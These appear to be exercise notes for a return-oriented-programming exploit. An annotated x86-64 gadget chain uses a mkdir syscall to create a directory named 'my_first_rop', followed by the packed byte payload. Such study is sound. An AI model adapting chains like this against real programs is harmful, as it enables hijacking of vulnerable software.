ret # from main \x71\x0e\x40\x00\x00\x00\x00\x00
pop %rax # need to hold address of "pop rsi" \xa1\x1d\x40\x00\x00\x00\x00\x00
ret # \x1e\x0e\x40\x00\x00\x00\x00\x00
push %rbp # contains NULL
mov %rsp, %rbp # rbp will contain address of my_first_rop + 13 + 8*2
call *%rax # pushes rip to stack
pop %rsi # will hold garbage rip
pop %r15 # will hold garbage rbp
ret \x71\x0e\x40\x00\x00\x00\x00\x00
pop %rax # need to hold address of "pop rsi" \xa1\x1d\x40\x00\x00\x00\x00\x00
ret # \x1e\x0e\x40\x00\x00\x00\x00\x00
push %rbp # contains address of my_first_rop + 13 + 8*2
mov %rsp, %rbp # irrelevant
call *%rax # pushes rip to stack
pop %rsi # garbage rip
pop %r15 # address of my_first_rop + 13 + 8*2
ret # \x6d\x1b\x40\x00\x00\x00\x00\x00
pop %rdi # offset 0xe3 which is -(13 + 8*2) of \xe3\xff\xff\xff\xff\xff\xff\xff
ret # \xf5\x08\x40\x00\x00\x00\x00\x00
add %r15 %rdi # r15 is address + offest and rdi is -offset
ret # \xa1\x1d\x40\x00\x00\x00\x00\x00
pop %rsi # permissions \xed\x01\x00\x00\x00\x00\x00\x00
pop %r15 # \xff\xff\xff\xff\xff\xff\xff\xff
ret # \x71\x0e\x40\x00\x00\x00\x00\x00
pop %rax # \x53\x00\x00\x00\x00\x00\x00\x00
ret # \x78\x11\x40\x00\x00\x00\x00\x00
syscall


aaaaaaaaaaamy_first_rop\x00

"aaaaaaaaaaamy_first_rop\x00\x71\x0e\x40\x00\x00\x00\x00\x00\xa1\x1d\x40\x00\x00\x00\x00\x00\x1e\x0e\x40\x00\x00\x00\x00\x00\x71\x0e\x40\x00\x00\x00\x00\x00\xa1\x1d\x40\x00\x00\x00\x00\x00\x1e\x0e\x40\x00\x00\x00\x00\x00\x6d\x1b\x40\x00\x00\x00\x00\x00\xe3\xff\xff\xff\xff\xff\xff\xff\xf5\x08\x40\x00\x00\x00\x00\x00\xa1\x1d\x40\x00\x00\x00\x00\x00\xed\x01\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x71\x0e\x40\x00\x00\x00\x00\x00\x53\x00\x00\x00\x00\x00\x00\x00\x78\x11\x40\x00\x00\x00\x00\x00"